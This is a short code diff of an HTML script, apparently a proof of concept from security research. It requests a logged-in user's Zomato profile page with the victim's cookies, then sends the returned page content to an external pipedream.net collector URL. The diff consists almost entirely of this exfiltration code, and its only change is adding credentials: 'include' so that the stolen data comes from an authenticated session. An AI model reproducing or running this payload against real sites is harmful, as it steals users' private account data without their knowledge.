@@ -1,5 +1,7 @@
 <script>
-  fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile')
+  fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
+    credentials: 'include'
+  })
     .then(r => r.text())
     .then(data => {
       fetch('https://eomfuajl79ed6za.m.pipedream.net?data=' + encodeURIComponent(data))
